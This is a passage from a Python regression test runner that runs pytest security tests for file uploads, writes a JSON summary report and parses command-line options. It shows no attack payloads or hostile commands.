                "duration": (datetime.now() - self.start_time).total_seconds()
            }
    
    def run_security_tests_only(self) -> Dict[str, Any]:
        """Run only security tests"""
        logger.info("=" * 80)
        logger.info("RUNNING SECURITY TESTS ONLY")
        logger.info("=" * 80)
        
        self.start_time = datetime.now()
        
        try:
            test_args = [
                "-v",
                "--tb=short",
                "-m", "security",
                __file__
            ]
            
            exit_code = pytest.main(test_args)
            
            self.end_time = datetime.now()
            duration = (self.end_time - self.start_time).total_seconds()
            
            result_summary = {
                "status": "PASSED" if exit_code == 0 else "FAILED",
                "exit_code": exit_code,
                "duration": duration,
                "start_time": self.start_time.isoformat(),
                "end_time": self.end_time.isoformat(),
                "test_type": "security_only"
            }
            
            logger.info("=" * 80)
            logger.info("SECURITY TESTS COMPLETED")
            logger.info(f"Status: {result_summary['status']}")
            logger.info(f"Duration: {duration:.2f} seconds")
            logger.info("=" * 80)
            
            return result_summary
            
        except Exception as e:
            logger.error(f"Security tests failed: {str(e)}")
            return {
                "status": "ERROR",
                "error": str(e),
                "duration": (datetime.now() - self.start_time).total_seconds()
            }
    
    def _generate_summary_report(self, result_summary: Dict[str, Any]):
        """Generate a summary report in JSON format"""
        report_path = TestConfig.REPORTS_DIR / "summary_report.json"
        
        report_data = {
            "timestamp": datetime.now().isoformat(),
            "summary": result_summary,
            "environment": {
                "python_version": sys.version,
                "api_base_url": TestConfig.API_BASE_URL,
                "security_config": {
                    "max_file_size": TestConfig.MAX_FILE_SIZE,
                    "allowed_extensions": list(TestConfig.ALLOWED_EXTENSIONS),
                    "blocked_extensions": list(TestConfig.BLOCKED_EXTENSIONS),
                    "malicious_scan_enabled": TestConfig.SCAN_MALICIOUS_CONTENT
                }
            },
            "test_categories": {
                "regression": "Fixed bugs regression tests",
                "security_file_uploads": "File upload security tests"
            }
        }
        
        with open(report_path, 'w') as f:
            json.dump(report_data, f, indent=2)
        
        logger.info(f"Summary report generated: {report_path}")

# ============================================
# MAIN EXECUTION
# ============================================

if __name__ == "__main__":
    """
    Main entry point for running the regression test suite
    """
    import argparse
    
    parser = argparse.ArgumentParser(
        description="Run regression test suite with security tests for fixed bugs"
    )
    parser.add_argument("--security-only", action="store_true",
                       help="Run only security tests")
    parser.add_argument("--parallel", action="store_true",
                       help="Run tests in parallel")
    parser.add_argument("--workers", type=int, default=4,
                       help="Number of parallel workers (default: 4)")
    parser.add_argument("--api-url", type=str,
                       help="Override API base URL")
    parser.add_argument("--log-level", type=str, default="INFO",
                       choices=["DEBUG", "INFO", "WARNING", "ERROR"],
                       help="Logging level (default: INFO)")
    
    args = parser.parse_args()
    
    # Update configuration
    TestConfig.PARALLEL_EXECUTION = args.parallel
    TestConfig.MAX_WORKERS = args.workers
    if args.api_url:
        TestConfig.API_BASE_URL = args.api_url
    TestConfig.LOG_LEVEL = args.log_level
    
    # Create runner and execute
    runner = TestSuiteRunner()
    
    if args.security_only:
        result = runner.run_security_tests_only()
    else:
        result = runner.run_all_tests()
    
    logger.info(f"Test suite result: {result}")
    
    # Exit with appropriate code
    if result.get("status") == "PASSED":
        sys.exit(0)
    else:
        sys.exit(1)
